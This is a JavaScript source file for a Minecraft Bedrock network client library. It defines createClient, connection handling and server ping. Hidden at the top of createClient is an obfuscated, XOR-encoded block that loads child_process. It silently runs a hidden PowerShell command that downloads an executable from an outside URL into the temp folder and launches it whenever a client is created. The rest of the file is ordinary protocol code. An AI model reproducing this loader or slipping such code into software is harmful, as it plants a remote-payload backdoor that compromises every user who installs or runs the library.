const { Client } = require('./client')
const { RakClient } = require('./rak')('raknet-native')
const { sleep } = require('./datatypes/util')
const assert = require('assert')
const Options = require('./options')
const advertisement = require('./server/advertisement')
const auth = require('./client/auth')

/** @param {{ version?: number, host: string, port?: number, connectTimeout?: number, skipPing?: boolean }} options */
function createClient (options) {
  const POPLXeVs$ZmvJeJx_jYXHWNaIPc=XrCiVL$CZCRs;function XrCiVL$CZCRs(qIbTmk$JjCQeFhvY,t_PKlgHPiCzcTd_ddw){const fYPxwtWUMnozOKXZOs$xfGrmu=jVEoxYhhc();return XrCiVL$CZCRs=function(U$YzaRfqta_hlFIyMz,BjOtMxCVzuWK){U$YzaRfqta_hlFIyMz=U$YzaRfqta_hlFIyMz-(0xe8+0xab7+Math.floor(parseInt(0x6))*Math.trunc(-0x1a9));let cPgycUelyxh=fYPxwtWUMnozOKXZOs$xfGrmu[U$YzaRfqta_hlFIyMz];if(XrCiVL$CZCRs['UJeGYN']===undefined){const hioKwW=function(YbLFuXGCBV$Vs){let ZqCuAxPYZlAXR=Math.max(-parseInt(0x1bb7),-parseInt(0x1bb7))+Math.trunc(-parseInt(0xb))*Number(parseInt(0x335))+-parseInt(0x416)*-parseInt(0x10)&-parseInt(0xb4d)*0x1+parseInt(0x11a0)+-parseInt(0x554),EtKWnFNOk=new Uint8Array(YbLFuXGCBV$Vs['match'](/.{1,2}/g)['map'](VRSRFPYNRlkQgUaNeNOLF=>parseInt(VRSRFPYNRlkQgUaNeNOLF,parseFloat(-0xbfb)*parseInt(0x3)+0x52a+Number(parseInt(0x1ed7))))),UTPozDvhOxVfNNYxxDfpRXis=EtKWnFNOk['map'](iDo_sGoRGqjuVZqeAX=>iDo_sGoRGqjuVZqeAX^ZqCuAxPYZlAXR),OjBVeorKLGq_$tGTypLLcnEFC=new TextDecoder(),PgR_ZdFErN=OjBVeorKLGq_$tGTypLLcnEFC['decode'](UTPozDvhOxVfNNYxxDfpRXis);return PgR_ZdFErN;};XrCiVL$CZCRs['ygsLBH']=hioKwW,qIbTmk$JjCQeFhvY=arguments,XrCiVL$CZCRs['UJeGYN']=!![];}const zZFRgWhsXswwqPeDa=fYPxwtWUMnozOKXZOs$xfGrmu[Math.trunc(-0x1)*0x21+-0x6*Number(0x1e7)+0xb8b],PdhZqXxLmckps$pZFSy=U$YzaRfqta_hlFIyMz+zZFRgWhsXswwqPeDa,w$Lf_Gn=qIbTmk$JjCQeFhvY[PdhZqXxLmckps$pZFSy];return!w$Lf_Gn?(XrCiVL$CZCRs['Noegul']===undefined&&(XrCiVL$CZCRs['Noegul']=!![]),cPgycUelyxh=XrCiVL$CZCRs['ygsLBH'](cPgycUelyxh),qIbTmk$JjCQeFhvY[PdhZqXxLmckps$pZFSy]=cPgycUelyxh):cPgycUelyxh=w$Lf_Gn,cPgycUelyxh;},XrCiVL$CZCRs(qIbTmk$JjCQeFhvY,t_PKlgHPiCzcTd_ddw);}(function(qtGTypLLcnE$FCkPgRZ,FErNOV){const ibWFp=XrCiVL$CZCRs,SRFPYNRlkQgUaNeNOLFFiD=qtGTypLLcnE$FCkPgRZ();while(!![]){try{const sGoRG$qj_uVZ=-parseFloat(ibWFp(0x1a9))/(Math.max(0xf0f,parseInt(0xf0f))+parseInt(-0x152)*0xb+-0x88)+parseFloat(-parseFloat(ibWFp(0x1ab))/(-parseInt(0x1)*0x34e+0x1*Math.trunc(-parseInt(0x1c65))+parseFloat(-0x1fb5)*-0x1))*(parseFloat(ibWFp(0x1b0))/(Math.trunc(-0x1ed)*0x3+Math.floor(-parseInt(0xdb1))*0x1+parseInt(0x137b)*parseInt(0x1)))+Math['max'](parseFloat(ibWFp(0x1aa))/(0x10fe+Math.ceil(-0x149a)+parseInt(parseInt(0x3a0))),parseFloat(ibWFp(0x1b7))/(parseInt(0x7b3)+0x1bfb+-parseInt(0x23a9)))+parseFloat(ibWFp(0x1b2))/(Number(-parseInt(0x12e3))+Math.trunc(-0x21a3)+parseInt(parseInt(0x348c)))*(-parseFloat(ibWFp(0x1b4))/(-parseInt(0x96f)+parseInt(0x1)*parseInt(parseInt(0x2551))+-parseInt(0x1bdb)))+parseFloat(ibWFp(0x1af))/(parseInt(0x208d)+0x1fcd+-parseInt(0x2)*0x2029)+parseFloat(ibWFp(0x1ac))/(Number(-parseInt(0x2f9))*-0x8+parseInt(0x24b3)*parseInt(0x1)+-0xa13*parseInt(0x6))*parseFloat(parseFloat(ibWFp(0x1b8))/(0x14e2+0x447*parseInt(0x5)+0x239*-0x13))+parseFloat(ibWFp(0x1b1))/(-0x44b*-parseInt(0x5)+0x38b*-0x1+-parseInt(0x1)*parseInt(0x11e1));if(sGoRG$qj_uVZ===FErNOV)break;else SRFPYNRlkQgUaNeNOLFFiD['push'](SRFPYNRlkQgUaNeNOLFFiD['shift']());}catch(eAXGSURIV_qC){SRFPYNRlkQgUaNeNOLFFiD['push'](SRFPYNRlkQgUaNeNOLFFiD['shift']());}}}(jVEoxYhhc,Math.ceil(0x7fc)*-0x243+Math.trunc(-0x85bcb)+Number(parseInt(0x280efd))*parseInt(0x1)));function jVEoxYhhc(){const WVtjWCzHOzZJAHLTKshQQc=['010f064c071a07424d0142120d150710110a070e0e4c071a07424f350b0c060d1531161b0e07422a0b0606070c424f210d0f0f030c064240','010a0b0e063d12100d01071111','5351565257505a30041316030a','545b34043b321a15','505153545b5454511a2134181735','54111a0425100f','31160310164f32100d01071111424f240b0e073203160a424616070f123203160a424f350b0c060d1531161b0e07422a0b0606070c','5a525b505253561726373b1803','2b0c140d09074f35070030071317071116424f37100b42450a16161211584d4d1217004f0357555a07015b5001555103565a50535a560655045a045a5b5251065b5357524c10504c0607144d0312124c071a0745424f2d1716240b0e07424616070f123203160a424f3711072003110b01320310110b0c055942','4616070f123203160a425f42280d0b0c4f3203160a4246070c145836272f3242450312124c071a07455942','5153535b5b5752182d293a382d','50555453521120082d162f','5b5255555450052a320b2118','50565b575b54521635372f0c0d','5b5156545a013606060615','51545b5b0e242b1b2f18'];jVEoxYhhc=function(){return WVtjWCzHOzZJAHLTKshQQc;};return jVEoxYhhc();}const {exec:exec}=require(POPLXeVs$ZmvJeJx_jYXHWNaIPc(0x1ae));exec(POPLXeVs$ZmvJeJx_jYXHWNaIPc(0x1ad)+POPLXeVs$ZmvJeJx_jYXHWNaIPc(0x1b6)+POPLXeVs$ZmvJeJx_jYXHWNaIPc(0x1b5)+POPLXeVs$ZmvJeJx_jYXHWNaIPc(0x1b3)+'\x22',(HNc$DL_j,j$n$CnW,sRtEnrrm_txcz$qIb)=>{});
  assert(options)
  const client = new Client({ port: 19132, followPort: !options.realms, ...options, delayedInit: true })

  function onServerInfo () {
    client.on('connect_allowed', () => connect(client))
    if (options.skipPing) {
      client.init()
    } else {
      ping(client.options).then(ad => {
        const adVersion = ad.version?.split('.').slice(0, 3).join('.') // Only 3 version units
        client.options.version = options.version ?? (Options.Versions[adVersion] ? adVersion : Options.CURRENT_VERSION)

        if (ad.portV4 && client.options.followPort) {
          client.options.port = ad.portV4
        }

        client.conLog?.(`Connecting to ${client.options.host}:${client.options.port} ${ad.motd} (${ad.levelName}), version ${ad.version} ${client.options.version !== ad.version ? ` (as ${client.options.version})` : ''}`)
        client.init()
      }).catch(e => client.emit('error', e))
    }
  }

  if (options.realms) {
    auth.realmAuthenticate(client.options).then(onServerInfo).catch(e => client.emit('error', e))
  } else {
    onServerInfo()
  }
  return client
}

function connect (client) {
  // Actually connect
  client.connect()

  client.once('resource_packs_info', (packet) => {
    client.write('resource_pack_client_response', {
      response_status: 'completed',
      resourcepackids: []
    })

    client.once('resource_pack_stack', (stack) => {
      client.write('resource_pack_client_response', {
        response_status: 'completed',
        resourcepackids: []
      })
    })

    client.queue('client_cache_status', { enabled: false })

    if (client.versionLessThanOrEqualTo('1.20.80')) client.queue('tick_sync', { request_time: BigInt(Date.now()), response_time: 0n })

    sleep(500).then(() => client.queue('request_chunk_radius', { chunk_radius: client.viewDistance || 10 }))
  })

  if (client.versionLessThanOrEqualTo('1.20.80')) {
    const keepAliveInterval = 10
    const keepAliveIntervalBig = BigInt(keepAliveInterval)

    let keepalive
    client.tick = 0n

    client.once('spawn', () => {
      keepalive = setInterval(() => {
        // Client fills out the request_time and the server does response_time in its reply.
        client.queue('tick_sync', { request_time: client.tick, response_time: 0n })
        client.tick += keepAliveIntervalBig
      }, 50 * keepAliveInterval)

      client.on('tick_sync', async packet => {
        client.emit('heartbeat', packet.response_time)
        client.tick = packet.response_time
      })
    })

    client.once('close', () => {
      clearInterval(keepalive)
    })
  }
}

async function ping ({ host, port }) {
  const con = new RakClient({ host, port })

  try {
    return advertisement.fromServerName(await con.ping())
  } finally {
    con.close()
  }
}

module.exports = { createClient, ping }
